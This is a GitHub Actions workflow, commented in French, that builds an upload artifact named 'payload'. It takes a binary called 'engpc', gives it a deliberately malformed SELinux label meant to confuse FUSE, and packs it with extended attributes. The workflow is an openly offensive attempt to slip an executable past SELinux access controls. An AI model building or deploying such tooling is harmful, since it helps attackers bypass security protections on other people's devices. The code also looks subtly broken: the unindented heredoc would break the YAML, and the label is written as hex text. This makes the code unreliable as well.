name: Build Payload
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    
    - name: Install tools
      run: |
        sudo apt-get install -y attr python3
    
    - name: Create payload with fake SELinux label
      run: |
        python3 << 'PYEOF'
import os, struct, base64, zlib

# Lire le payload engpc (sera uploadé)
with open("engpc", "rb") as f:
    data = f.read()

# Créer xattr SELinux malformé
# Format invalide que fuse ne reconnaît pas
fake_label = b"u:object_r:\x00\xff\xfe" + b"engpc_exec:s0\x00"

# Écrire le fichier
with open("payload", "wb") as f:
    f.write(data)

# Assigner le xattr malformé
os.system("attr -s selinux -V '" + 
          fake_label.hex() + 
          "' payload")

os.system("tar --xattrs -czf payload.tar.gz payload")
PYEOF

    - name: Upload artifact
      uses: actions/upload-artifact@v3
      with:
        name: payload
        path: payload.tar.gz
